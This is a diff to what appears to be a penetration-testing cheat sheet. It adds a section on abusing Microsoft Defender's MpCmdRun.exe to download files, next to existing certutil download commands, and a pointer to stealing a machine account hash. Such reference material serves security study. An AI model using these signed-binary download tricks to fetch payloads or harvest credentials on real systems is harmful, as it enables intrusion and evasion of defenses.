@@ -482,9 +482,19 @@ certutil -urlcache -split -f %url% %file%
 certutil.exe -verifyctl -f -split %url% %file%
 ```
 
+### Using Microsoft Defender MpCmdRun.exe
+
+* [https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/](https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/)
+
+```text
+MpCmdRun.exe -DownloadFile -url $url_of_file -path $out_file_path
+```
+
+Also: See APT writeup for how to use this tool to retrieve machine account hash for total pwnage!
+
 ### C\# Command-line build with csc.exe:
 
-[https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe)
+* [https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe)
 
 ```csharp
 using System;
